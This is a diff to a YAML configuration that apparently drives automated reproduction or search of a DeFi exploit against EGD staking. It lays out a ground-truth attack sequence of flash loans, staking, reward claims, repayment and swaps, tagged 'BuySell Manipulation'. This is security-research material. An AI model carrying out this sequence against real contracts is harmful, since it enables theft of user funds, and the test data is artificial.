@@ -25,29 +25,33 @@ ctrt_name2deploy:
     ]
 
 extra_actions:
-  - "function transaction_egdstaking_egd(uint256 amount) internal {
+  - "function deposit_egdstaking_usdt_egdslp(uint256 amount) internal eurus {
+    usdt.approve(address(egdstaking), amount);
+    egdstaking.stake(amount);
+    vm.warp(block.timestamp + 54);
+    }"
+
+  - "function withdraw_egdstaking_egdslp_egd(uint256 amount) internal eurus {
     egdstaking.claimAllReward();
     }"
 
 extra_deployments_before:
   - "egd.afterDeploy(owner, attacker, address(pair), address(egdstaking));"
 
-extra_deployments:
-  - "usdt.transfer(attacker, 100 ether);"
-  - "attackContract.setUp(address(usdt), address(egdstaking));"
+extra_deployments: []
 
-extra_statements:
-  - "vm.warp(block.timestamp + 54);"
+extra_statements: []
 
 attack_goal_str: "usdt"
 
 groundtruth:
-  - ["borrow", "owner", "usdt", "2000e18"]
-  - ["borrow", "pair", "usdt", "424526.221219952604636716e18"]
-  - ["transaction", "egdstaking", "egd", "0"]
-  - ["payback", "pair", "usdt", "uint256(424526.221219952604636716e18 * 1003) / 1000"]
-  - ["swap", "pair", "egd", "usdt", "egd.balanceOf(address(attacker))"]
-  - ["payback", "owner", "usdt", "2000e18 * 1003 / 1000"]
+  - ["borrow", "usdt", "owner", "2100e18"]
+  - ["deposit", "egdstaking", "usdt", "egdslp", "100e18"]
+  - ["borrow", "usdt", "pair", "424526221219952604636716"]
+  - ["withdraw", "egdstaking", "egdslp", "egd", "0"]
+  - ["payback", "usdt", "pair", "uint(424526221219952604636716) * 1003 / 1000"]
+  - ["swap", "pair", "attacker", "egd", "usdt", "egd.balanceOf(attacker)", "pair.getAmountOut(egd.balanceOf(attacker), address(egd))"]
+  - ["payback", "usdt", "owner", "2100e18 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -61,7 +65,8 @@ roles:
     is_stablecoin: false
   "pair":
     is_swappair: true
-    uniswap_order: ["egd", "usdt"]
+    is_uniswap: true
+    token_pair: ["egd", "usdt"]
     support_swaps:
       "usdt": ["egd", "usdt"]
       "egd": ["egd", "usdt"]
@@ -71,5 +76,7 @@ roles:
   "egdstaking":
     is_defientry: true
     hacked_assets: ["egd"]
+  "egdslp":
+    is_asset: true
 
 pattern: "BuySell Manipulation"
